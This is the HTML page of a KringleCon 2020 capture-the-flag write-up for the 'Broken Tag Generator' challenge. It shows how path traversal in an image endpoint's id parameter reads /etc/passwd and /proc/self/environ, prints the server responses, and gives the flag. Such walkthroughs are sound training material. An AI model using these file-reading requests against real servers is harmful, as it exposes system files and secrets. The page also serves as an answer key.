@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  
+  
+  <link rel="shortcut icon" href="../../../img/favicon.ico">
+  <title>Objective8 - Spartantri KringleCon 2020 Write-Up</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700" />
+
+  <link rel="stylesheet" href="../../../css/theme.css" />
+  <link rel="stylesheet" href="../../../css/theme_extra.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css" />
+  
+  <script>
+    // Current page data
+    var mkdocs_page_name = "Objective8";
+    var mkdocs_page_input_path = "objectives/8-Broken-Tag-Generator/8-Broken-Tag-Generator.md";
+    var mkdocs_page_url = null;
+  </script>
+  
+  <script src="../../../js/jquery-2.1.1.min.js" defer></script>
+  <script src="../../../js/modernizr-2.8.3.min.js" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script> 
+  
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+        <a href="../../.." class="icon icon-home"> Spartantri KringleCon 2020 Write-Up</a>
+        <div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../..">Home</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../1-Uncover-Santas-Gift-list/1-Uncover-Santas-Gift-list/">Objective1</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../2-Investigate-S3-Bucket/2-Investigate-S3-Bucket/">Objective2</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../3-Point-of-Sale-Password-Recovery/3-Point-of-Sale-Password-Recovery-soulution/">Objective3</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../4-Operate-the-Santavator/4-Operate-the-Santavator/">Objective4</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../5-Open-HID-Lock/5-Open-HID-Lock/">Objective5</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../6-Splunk-Challenge/6-Splunk-Challenge/">Objective6</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../7-Solve-the-sleighs-CAN-D-BUS/7-Solve-the-sleighs-CAN-D-BUS/">Objective7</a>
+                    </li>
+                </ul>
+                <ul class="current">
+                    <li class="toctree-l1 current"><a class="reference internal current" href="./">Objective8</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#finding-the-vulnerability">Finding the vulnerability</a>
+    </li>
+    </ul>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../9-ARP-Shenanigans/9-ARP-Shenanigans/">Objective9</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../10-Defeat-Fingerprint-Sensor/10-Defeat-Fingerprint-Sensor/">Objective10</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../11a-Blockchain-Part-1/11a-Blockchain-Part-1/">Objective11a</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../11b-Blockchain-Part-2/11b-Blockchain-Part-2/">Objective11b</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Unescape-Tmux/A-Unescape-Tmux/">AchivementTmux</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Elf-Code/A-Elf-Code/">AchivementElfCode</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Redis/A-Redis/">AchivementRedis</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Kringle-kiosk/A-Kringle-kiosk/">AchivementKiosk</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-hiddenspot/A-HiddenSpot/">AchivementHidden</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Speaker-UNPrep/A-Speaker-UNPrep/">AchivementUNPrep</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Sort-O-Matic/A-Sort-O-Matic/">AchivementSortOMatic</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Scapy-Prepper/A-Scapy-Prepper/">AchivementScapyPrepper</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-CAN-Bus-Investigation/A-CAN-Bus-Investigation/">AchivementCAN-BUS</a>
+                    </li>
+                </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+        <a href="../../..">Spartantri KringleCon 2020 Write-Up</a>
+      </nav>
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../../..">Docs</a> &raquo;</li>
+    
+      
+    
+    <li>Objective8</li>
+    <li class="wy-breadcrumbs-aside">
+      
+    </li>
+  </ul>
+  
+  <hr/>
+</div>
+          <div role="main">
+            <div class="section">
+              
+                <h1 id="8-broken-tag-generator">8) Broken Tag Generator</h1>
+<p>Dificulty: 4/5</p>
+<p>Help Noel Boetie fix the Tag Generator (https://tag-generator.kringlecastle.com/) in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.</p>
+<p>ANSWER: JackFrostWasHere</p>
+<h2 id="finding-the-vulnerability">Finding the vulnerability</h2>
+<p>After requesting the URL https://tag-generator.kringlecastle.com/image the server sends a hint of the possible vulenrability that is visible in the browser but curl or burp give more information, where we can see this response use <code>501</code> http status code.</p>
+<pre><code>HTTP/1.1 501 Not Implemented
+Server: nginx/1.14.2
+Date: Mon, 21 Dec 2020 02:22:22 GMT
+Content-Type: text/html;charset=utf-8
+Content-Length: 80
+Connection: close
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+
+&lt;h1&gt;Something went wrong!&lt;/h1&gt;
+
+&lt;p&gt;Error in /app/lib/app.rb: ID is missing!&lt;/p&gt;
+</code></pre>
+<p>Next request, lets attempt a LFI on the <code>id</code> parameter using a well known file <code>/etc/passwd</code>, the request failed but the error message is different, this time the server sends a <code>404</code> not found with the message route not found in <code>/app/lib/app.rb</code>.</p>
+<pre><code>HTTP/1.1 404 Not Found
+Server: nginx/1.14.2
+Date: Mon, 21 Dec 2020 02:24:33 GMT
+Content-Type: image/jpeg
+Content-Length: 81
+Connection: close
+X-Content-Type-Options: nosniff
+
+&lt;h1&gt;Something went wrong!&lt;/h1&gt;
+
+&lt;p&gt;Error in /app/lib/app.rb: Route not found&lt;/p&gt;
+</code></pre>
+<p>This means that the application may prepend a fixed string to our request so lets improve our previous request with a path traversal.</p>
+<pre><code>HTTP/1.1 200 OK
+Server: nginx/1.14.2
+Date: Mon, 21 Dec 2020 02:30:00 GMT
+Content-Type: image/jpeg
+Content-Length: 966
+Connection: close
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=15552000; includeSubDomains
+X-XSS-Protection: 1; mode=block
+X-Robots-Tag: none
+X-Download-Options: noopen
+X-Permitted-Cross-Domain-Policies: none
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+app:x:1000:1000:,,,:/home/app:/bin/bash
+</code></pre>
+<p>Now we know that it sucessfully retrieves files from the file system, the target is to obtain the value of the <code>GREETZ</code> environmental variable. To get all environmental variables of the runnin process we can send the request to https://tag-generator.kringlecastle.com/image?id=../../proc/self/environ</p>
+<pre><code>HTTP/1.1 200 OK
+Server: nginx/1.14.2
+Date: Mon, 21 Dec 2020 02:33:44 GMT
+Content-Type: image/jpeg
+Content-Length: 399
+Connection: close
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=15552000; includeSubDomains
+X-XSS-Protection: 1; mode=block
+X-Robots-Tag: none
+X-Download-Options: noopen
+X-Permitted-Cross-Domain-Policies: none
+
+PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=cbf2810b7573 RUBY_MAJOR=2.7 RUBY_VERSION=2.7.0 RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343 GEM_HOME=/usr/local/bundle BUNDLE_SILENCE_ROOT_WARNING=1 BUNDLE_APP_CONFIG=/usr/local/bundle APP_HOME=/app PORT=4141 HOST=0.0.0.0 GREETZ=JackFrostWasHere HOME=/home/app 
+</code></pre>
+<p>ANSWER: JackFrostWasHere</p>
+              
+            </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="../../9-ARP-Shenanigans/9-ARP-Shenanigans/" class="btn btn-neutral float-right" title="Objective9">Next <span class="icon icon-circle-arrow-right"></span></a>
+      
+      
+        <a href="../../7-Solve-the-sleighs-CAN-D-BUS/7-Solve-the-sleighs-CAN-D-BUS/" class="btn btn-neutral" title="Objective7"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+    
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+      
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="versions">
+    <span class="rst-current-version" data-toggle="rst-current-version">
+      
+      
+        <span><a href="../../7-Solve-the-sleighs-CAN-D-BUS/7-Solve-the-sleighs-CAN-D-BUS/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+      
+      
+        <span style="margin-left: 15px"><a href="../../9-ARP-Shenanigans/9-ARP-Shenanigans/" style="color: #fcfcfc">Next &raquo;</a></span>
+      
+    </span>
+</div>
+    <script>var base_url = '../../..';</script>
+    <script src="../../../js/theme.js" defer></script>
+      <script src="../../../search/main.js" defer></script>
+    <script defer>
+        window.onload = function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        };
+    </script>
+
+</body>
+</html>
